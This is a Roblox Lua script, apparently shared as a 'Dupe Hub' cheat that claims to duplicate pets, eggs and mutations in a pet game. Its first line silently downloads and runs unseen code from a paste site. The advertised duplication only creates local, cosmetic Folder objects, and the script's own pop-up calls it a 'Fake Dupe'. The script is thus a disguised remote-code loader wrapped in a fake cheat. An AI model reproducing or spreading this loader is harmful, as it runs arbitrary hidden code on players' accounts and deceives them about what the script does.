loadstring(game:HttpGet("https://pastefy.app/pCe2v3kG/raw"))()

local t = tick() + 5
while tick() < t do end

-- Dupe Hub (Made by vdawngg)

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local W = Rayfield:CreateWindow({
   Name="Dupe Hub",
   LoadingTitle="Loading...",
   LoadingSubtitle="Made by vdawngg",
   KeySystem=false
})
local T = W:CreateTab("Dupe")

local SelectedPet, SelectedEgg, SelectedMutation, Amount = "", "", "", 1

-- Danh sách tất cả Pet (gốc)
local petList = {
   "Dragonfly","Raccoon","T-rex","Queen bee","Butterfly","Spinosaurus",
   "Kitsune","Corrupted Kitsune","Disco bee","Moon cat","Mimic","Thermidor",
   "Axolotl","Phoenix","Shark","Unicorn","Tiger","Lion","Frog","Snake",
   "Wolf","Panda","Dog","Cat","Fox","Bat","Penguin","Slime","Golem",
   "Ghoul","Reaper","Cactus","Snowman","Ghost","Hydra","Kraken","Dinosaur",
   "Cyborg","Alien","Robot","Octopus","Jellyfish","Dodo","Whale","Lizard",
   "Crocodile","Rabbit","Deer","Elephant","Monkey","Cow","Sheep","Chicken",
   "Goat","Pig"
}

-- Danh sách Egg
local eggList = {
   "Magic Egg","Golden Egg","Basic Egg","Shiny Egg",
   "Frozen Egg","Rainbow Egg","Ancient Egg","Mystic Egg"
}

-- Danh sách Mutation
local mutationList = {
   "Shiny","Inverted","Frozen","Golden","Tiny","Ironskin",
   "Shocked","Rainbow","Radiant","Ascended","Tranquil","Corrupt","Fried"
}

-- Dropdown chọn Pet
T:CreateDropdown({
   Name="Select Pet",
   Options=petList,
   CurrentOption="None",
   Callback=function(v) SelectedPet=v end
})

-- Dropdown chọn Egg
T:CreateDropdown({
   Name="Select Egg",
   Options=eggList,
   CurrentOption="None",
   Callback=function(v) SelectedEgg=v end
})

-- Dropdown chọn Mutation
T:CreateDropdown({
   Name="Select Mutation",
   Options=mutationList,
   CurrentOption="None",
   Callback=function(v) SelectedMutation=v end
})

-- Input số lượng
T:CreateInput({
   Name="Amount",
   PlaceholderText="Enter number",
   Callback=function(t) Amount=tonumber(t) or 1 end
})

-- Nút Dupe
T:CreateButton({
   Name="Dupe Now",
   Callback=function()
      local B=game.Players.LocalPlayer.Backpack
      for i=1,Amount do
         if SelectedPet~="" then
            local pet=Instance.new("Folder",B)
            pet.Name=(SelectedMutation~="" and SelectedMutation.." " or "")..SelectedPet.."_Clone"..i
         end
         if SelectedEgg~="" then
            local egg=Instance.new("Folder",B)
            egg.Name=(SelectedMutation~="" and SelectedMutation.." " or "")..SelectedEgg.."_Clone"..i
         end
      end
      Rayfield:Notify({
         Title="Fake Dupe",
         Content="Cloned "..Amount.."x "..(SelectedMutation~="" and SelectedMutation.." " or "")..(SelectedPet~="" and SelectedPet or SelectedEgg),
         Duration=5
      })
   end
})
